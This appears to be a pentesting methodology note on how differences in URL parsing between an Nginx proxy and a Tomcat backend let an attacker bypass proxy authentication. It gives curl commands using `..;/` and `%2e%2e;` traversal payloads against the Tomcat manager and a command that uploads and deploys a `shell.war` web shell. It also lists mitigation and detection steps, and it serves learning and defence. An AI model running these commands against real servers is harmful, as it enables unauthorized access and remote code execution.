---
topic: URL parser differential — proxy and backend
tags: [web, nginx, tomcat, proxy, auth-bypass]
---

# URL parser differential — proxy and backend

**English** | [🌐 Español](url-parser-differential.md)

## Concept

When Nginx and Tomcat interpret the same URL differently, a proxy authentication rule may apply to a path the backend resolves as another. Sequences such as `..;/`, `%2e%2e` or normalized slashes reach protected endpoints, like the Tomcat manager, and deploy an application.

## When it applies

- A proxy sits in front of an application server.
- Authentication is applied by path at the proxy.
- The backend normalizes the path differently.

## Procedure

1. Identify proxy and backend through headers and errors.
2. Test traversal and normalization variants.
3. Compare responses with and without authentication.
4. Use the bypassing path to deploy or access.

## Commands

```bash
curl -s -I http://<HOST>/
curl -s "http://<HOST>/manager/html"
curl -s "http://<HOST>/manager/..;/html"
curl -s "http://<HOST>/manager/%2e%2e;/html"
curl -u <USER>:<PASS> --upload-file shell.war "http://<HOST>/manager/text/deploy?path=/shell"
```

## Variants

- Use `;` for matrix parameters.
- Try casing and double encoding.
- Combine with `X-Forwarded-*` if the backend trusts them.

## Limitations

- The proxy may reject non-normalized paths.
- The backend may be patched.
- Authentication may also exist at the backend.

## Mitigation

- Normalize and validate paths in both components.
- Authenticate at the backend, not only at the proxy.
- Disable the manager and restrict deployments.

## Detection

- Paths with `..;/` or unusual encodings.
- 200 responses to protected paths.
- Unplanned WAR deployments.

## References

- [0xdf — Seal](https://0xdf.gitlab.io/2021/11/13/htb-seal.html)
- [Tomcat — Security](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)
- [CWE-436 — Interpretation Conflict](https://cwe.mitre.org/data/definitions/436.html)
